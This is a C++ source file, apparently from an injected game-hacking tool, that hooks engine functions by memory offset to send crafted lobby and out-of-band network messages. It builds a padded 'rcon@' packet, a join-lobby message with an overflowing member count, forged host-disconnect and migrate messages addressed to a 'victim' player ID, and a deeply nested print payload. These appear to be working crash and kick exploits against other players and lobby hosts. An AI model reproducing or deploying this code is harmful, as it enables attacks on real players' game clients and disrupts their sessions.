#include "send.hpp"
#include "../../engine/engine.hpp"
#include "../../utils/log/log.hpp"
#include "../../utils/crypt/crypt.hpp"
#include "../../features/overlay/overlay.hpp"

namespace send
{
    bool send_relay_test(const target_info& target)
    {
        if (engine::oob_print == nullptr)
        {
            features::overlay::notify(cx("relay failed: no oob func."), features::overlay::level::warn);

            return false;
        }

        engine::netadr_s adr = target.netadr;

        char line[96];

        snprintf(line, sizeof(line), "relay to %u.%u.%u.%u:%u type=%d", adr.ip[0], adr.ip[1], adr.ip[2], adr.ip[3], adr.port, adr.type);

        T7_LOG(line);

        bool ok = engine::oob_print(0, &adr, "relay");

        if (ok)
        {
            features::overlay::notify(cx("relay sent."), features::overlay::level::info);
        }
        else
        {
            features::overlay::notify(cx("relay failed."), features::overlay::level::warn);
        }

        return ok;
    }

    bool send_oob_at(const target_info& target)
    {
        if (engine::oob_print == nullptr)
        {
            features::overlay::notify(cx("oob-at failed: no oob func."), features::overlay::level::warn);

            return false;
        }

        engine::netadr_s adr = target.netadr;

        char payload[128];

        int p = snprintf(payload, sizeof(payload), "rcon ");

        while (p < static_cast<int>(sizeof(payload)) - 1)
        {
            payload[p] = '@';

            p++;
        }

        payload[p] = 0;

        char line[96];

        snprintf(line, sizeof(line), "oob rcon@ to %u.%u.%u.%u:%u type=%d", adr.ip[0], adr.ip[1], adr.ip[2], adr.ip[3], adr.port, adr.type);

        T7_LOG(line);

        bool ok = engine::oob_print(0, &adr, payload);

        if (ok)
        {
            features::overlay::notify(cx("oob rcon@ sent."), features::overlay::level::info);
        }
        else
        {
            features::overlay::notify(cx("oob rcon@ failed."), features::overlay::level::warn);
        }

        return ok;
    }

    static uint32_t package_join_lobby(engine::lobby_msg_s* lm, uint8_t* scratch)
    {
        if (engine::lobby_prep_write_fn == nullptr)
        {
            return engine::message_type_none;
        }

        uint32_t type = engine::message_type_join_lobby;

        if (!engine::lobby_prep_write_fn(lm, scratch, engine::lobby_msg_scratch_size, type))
        {
            return engine::message_type_none;
        }

        int32_t zero = 0;

        uint64_t xuid = 0;

        int16_t network_mode = 0;

        uint32_t uint_scratch = 0;

        uint64_t joinnonce = 0;

        uint8_t chunk = 0;

        bool starter_pack = false;

        char password[32] = {};

        int32_t member_count = engine::lobby_members_overflow;

        engine::lobby_package_int(lm, cx("targetlobby").c_str(), &zero);

        engine::lobby_package_int(lm, cx("sourcelobby").c_str(), &zero);

        engine::lobby_package_int(lm, cx("jointype").c_str(), &zero);

        engine::lobby_package_xuid(lm, cx("probedxuid").c_str(), &xuid);

        engine::lobby_package_int(lm, cx("playlistid").c_str(), &zero);

        engine::lobby_package_int(lm, cx("playlistver").c_str(), &zero);

        engine::lobby_package_int(lm, cx("ffotdver").c_str(), &zero);

        engine::lobby_package_short(lm, cx("networkmode").c_str(), &network_mode);

        engine::lobby_package_uint(lm, cx("netchecksum").c_str(), &uint_scratch);

        engine::lobby_package_int(lm, cx("protocol").c_str(), &zero);

        engine::lobby_package_int(lm, cx("changelist").c_str(), &zero);

        engine::lobby_package_int(lm, cx("pingband").c_str(), &zero);

        engine::lobby_package_uint(lm, cx("dlcbits").c_str(), &uint_scratch);

        engine::lobby_package_uint64(lm, cx("joinnonce").c_str(), &joinnonce);

        engine::lobby_package_uchar(lm, cx("chunk").c_str(), &chunk);

        engine::lobby_package_uchar(lm, cx("chunk").c_str(), &chunk);

        engine::lobby_package_uchar(lm, cx("chunk").c_str(), &chunk);

        engine::lobby_package_bool(lm, cx("isStarterPack").c_str(), &starter_pack);

        engine::lobby_package_string(lm, cx("password").c_str(), password, sizeof(password));

        engine::lobby_package_int(lm, cx("membercount").c_str(), &member_count);

        engine::lobby_package_array_start(lm, cx("members").c_str());

        int32_t index = 0;

        while (true)
        {
            char more = index < member_count ? 1 : 0;

            engine::lobby_package_element(lm, more);

            if (more == 0)
            {
                break;
            }

            uint64_t lobbyid = 0;

            float skill = 0.0f;

            uint32_t probation = 0;

            engine::lobby_package_xuid(lm, cx("xuid").c_str(), &xuid);

            engine::lobby_package_uint64(lm, cx("lobbyid").c_str(), &lobbyid);

            engine::lobby_package_float(lm, cx("skillrating").c_str(), &skill);

            engine::lobby_package_float(lm, cx("skillvariance").c_str(), &skill);

            engine::lobby_package_uint(lm, cx("pprobation").c_str(), &probation);

            engine::lobby_package_uint(lm, cx("aprobation").c_str(), &probation);

            index++;
        }

        engine::lobby_package_int(lm, cx("splitscreen").c_str(), &zero);

        return type;
    }

    static uint32_t package_host_disconnect(engine::lobby_msg_s* lm, uint8_t* scratch, uint64_t victim_xuid)
    {
        if (engine::lobby_prep_write_fn == nullptr)
        {
            return engine::message_type_none;
        }

        uint32_t type = engine::message_type_lobby_host_disconnect;

        if (!engine::lobby_prep_write_fn(lm, scratch, engine::lobby_msg_scratch_size, type))
        {
            return engine::message_type_none;
        }

        int32_t lobby_type_field = 99;

        uint64_t xuid_field = victim_xuid;

        engine::lobby_package_int(lm, cx("lobbytype").c_str(), &lobby_type_field);

        engine::lobby_package_xuid(lm, cx("xuid").c_str(), &xuid_field);

        return type;
    }

    static uint32_t package_migrate_test(engine::lobby_msg_s* lm, uint8_t* scratch, uint64_t victim_xuid)
    {
        if (engine::lobby_prep_write_fn == nullptr)
        {
            return engine::message_type_none;
        }

        uint32_t type = engine::message_type_lobby_migrate_test;

        if (!engine::lobby_prep_write_fn(lm, scratch, engine::lobby_msg_scratch_size, type))
        {
            return engine::message_type_none;
        }

        int32_t lobby_type_field = 99;

        uint64_t xuid_field = victim_xuid;

        bool is_ack = false;

        int32_t time_ms = 0;

        uint8_t seq_or_count = 0;

        engine::lobby_package_int(lm, cx("lobbytype").c_str(), &lobby_type_field);

        engine::lobby_package_xuid(lm, cx("xuid").c_str(), &xuid_field);

        engine::lobby_package_bool(lm, cx("isack").c_str(), &is_ack);

        engine::lobby_package_int(lm, cx("timems").c_str(), &time_ms);

        engine::lobby_package_uchar(lm, cx("seqorcount").c_str(), &seq_or_count);

        return type;
    }

    static uint32_t package_print_nested(engine::lobby_msg_s* lm, uint8_t* scratch)
    {
        if (engine::lobby_prep_write_fn == nullptr)
        {
            return engine::message_type_none;
        }

        if (engine::msg_write_byte_fn == nullptr)
        {
            return engine::message_type_none;
        }

        uint32_t type = engine::message_type_peer_to_peer_info;

        if (!engine::lobby_prep_write_fn(lm, scratch, engine::lobby_msg_scratch_size, type))
        {
            return engine::message_type_none;
        }

        int count = 0;

        while (count < engine::lobby_print_nest_bytes)
        {
            engine::msg_write_byte_fn(lm, engine::lobby_print_array_tag);

            count++;
        }

        return type;
    }

    static bool send_to_host(engine::lobby_msg_s* lm, uint32_t type)
    {
        if (type == engine::message_type_none)
        {
            features::overlay::notify(cx("send failed: package."), features::overlay::level::warn);

            return false;
        }

        if (engine::lobby_frame_send_fn == nullptr || engine::lobby_channel_for_fn == nullptr)
        {
            features::overlay::notify(cx("send failed: no lobby funcs."), features::overlay::level::warn);

            return false;
        }

        void* lobby = engine::active_lobby();

        if (lobby == nullptr)
        {
            features::overlay::notify(cx("send failed: no active lobby."), features::overlay::level::warn);

            return false;
        }

        uint64_t host_xuid = engine::lobby_host_xuid(lobby);

        if (host_xuid == 0)
        {
            features::overlay::notify(cx("send failed: not a client (no host)."), features::overlay::level::warn);

            return false;
        }

        int lobby_id = *reinterpret_cast<int*>(static_cast<uint8_t*>(lobby) + engine::lobby_session_lobby_id);

        uint32_t channel = engine::lobby_channel_for_fn(lobby_id, engine::lobby_sub_channel_reliable);

        T7_LOG(std::string(cx("send: to host type=")) + std::to_string(type) + cx(" chan=") + std::to_string(channel) + cx(" host=") + std::to_string(host_xuid));

        uint32_t reached = engine::lobby_frame_send_fn(0, lobby, engine::lobby_direction_client_to_host, lm, type, channel);

        if (reached != 0)
        {
            features::overlay::notify(cx("sent to host."), features::overlay::level::info);
        }
        else
        {
            features::overlay::notify(cx("send to host failed."), features::overlay::level::warn);
        }

        return reached != 0;
    }

    static bool send_to_member(engine::lobby_msg_s* lm, uint32_t type, uint64_t victim_xuid, int direction)
    {
        if (type == engine::message_type_none)
        {
            features::overlay::notify(cx("send failed: package."), features::overlay::level::warn);

            return false;
        }

        if (engine::lobby_frame_send_addr_fn == nullptr || engine::lobby_channel_for_fn == nullptr)
        {
            features::overlay::notify(cx("send failed: no lobby funcs."), features::overlay::level::warn);

            return false;
        }

        void* lobby = engine::active_lobby();

        if (lobby == nullptr)
        {
            features::overlay::notify(cx("send failed: no active lobby."), features::overlay::level::warn);

            return false;
        }

        void* xnaddr = engine::lobby_member_xnaddr(lobby, victim_xuid);

        if (xnaddr == nullptr)
        {
            features::overlay::notify(cx("send failed: member not found."), features::overlay::level::warn);

            return false;
        }

        int lobby_id = *reinterpret_cast<int*>(static_cast<uint8_t*>(lobby) + engine::lobby_session_lobby_id);

        uint32_t channel = engine::lobby_channel_for_fn(lobby_id, engine::lobby_sub_channel_reliable);

        T7_LOG(std::string(cx("send: to member type=")) + std::to_string(type) + cx(" dir=") + std::to_string(direction) + cx(" xuid=") + std::to_string(victim_xuid));

        bool reached = engine::lobby_frame_send_addr_fn(0, channel, direction, xnaddr, victim_xuid, lm, type);

        if (reached)
        {
            features::overlay::notify(cx("sent to member."), features::overlay::level::info);
        }
        else
        {
            features::overlay::notify(cx("send to member failed."), features::overlay::level::warn);
        }

        return reached;
    }

    bool send_join_overflow(const target_info& target)
    {
        (void)target;

        static uint8_t scratch[engine::lobby_msg_scratch_size];

        engine::lobby_msg_s lm = {};

        uint32_t type = package_join_lobby(&lm, scratch);

        return send_to_host(&lm, type);
    }

    bool send_host_disconnect(const target_info& target)
    {
        static uint8_t scratch[engine::lobby_msg_scratch_size];

        engine::lobby_msg_s lm = {};

        uint32_t type = package_host_disconnect(&lm, scratch, target.xuid);

        return send_to_member(&lm, type, target.xuid, engine::lobby_direction_host_to_client);
    }

    bool send_migrate_test(const target_info& target)
    {
        static uint8_t scratch[engine::lobby_msg_scratch_size];

        engine::lobby_msg_s lm = {};

        uint32_t type = package_migrate_test(&lm, scratch, target.xuid);

        return send_to_member(&lm, type, target.xuid, engine::lobby_direction_peer);
    }

    bool send_print_nested(const target_info& target)
    {
        static uint8_t scratch[engine::lobby_msg_scratch_size];

        engine::lobby_msg_s lm = {};

        uint32_t type = package_print_nested(&lm, scratch);

        return send_to_member(&lm, type, target.xuid, engine::lobby_direction_peer);
    }

    void initialize()
    {
        engine::oob_print = reinterpret_cast<engine::oob_print_t>(engine::base() + engine::offset::net_out_of_band_print);

        engine::lobby_prep_write_fn = reinterpret_cast<engine::lobby_prep_write_t>(engine::base() + engine::offset::lobby_prep_write);

        engine::lobby_frame_send_fn = reinterpret_cast<engine::lobby_frame_send_t>(engine::base() + engine::offset::lobby_frame_send);

        engine::lobby_frame_send_addr_fn = reinterpret_cast<engine::lobby_frame_send_addr_t>(engine::base() + engine::offset::lobby_frame_send_addr);

        engine::lobby_channel_for_fn = reinterpret_cast<engine::lobby_channel_for_t>(engine::base() + engine::offset::lobby_channel_for);

        engine::lobby_package_float = reinterpret_cast<engine::lobby_package_float_t>(engine::base() + engine::offset::lobby_pkg_float);

        engine::msg_write_byte_fn = reinterpret_cast<engine::msg_write_byte_t>(engine::base() + engine::offset::msg_write_byte);

        T7_LOG(cx("send: initialized."));
    }
}
